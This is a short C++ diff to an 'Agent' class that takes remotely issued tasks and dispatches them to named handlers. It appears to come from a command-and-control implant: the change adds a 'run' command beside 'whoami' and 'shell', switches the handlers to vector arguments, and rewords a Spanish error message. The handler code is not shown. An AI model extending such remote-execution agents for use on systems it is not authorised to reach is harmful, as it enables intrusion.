@@ -11,11 +11,12 @@ Agent::Agent(){
 
 }
 
-std::unordered_map<std::string, std::string(*)(std::string arguments)> Agent::loadCommands() {
-	std::unordered_map<std::string, std::string(*)(std::string arguments)> commands;
+std::unordered_map<std::string, std::string(*)(std::vector<std::string> arguments)> Agent::loadCommands() {
+	std::unordered_map<std::string, std::string(*)(std::vector<std::string> arguments)> commands;
 
 	commands["whoami"] = &whoami;
 	commands["shell"] = &shell;
+	commands["run"] = &run;
 
 	return commands;
 }
@@ -73,7 +74,7 @@ void Agent::executeTask(Task& task) {
 		command_output = Commands[task.command](task.arguments);
 	}
 	else {
-		command_output = "Error ejecutando el comando";
+		command_output = "Comando no encontrado";
 	}
 	
 	std::cout << "Commands Output: " << command_output << std::endl;
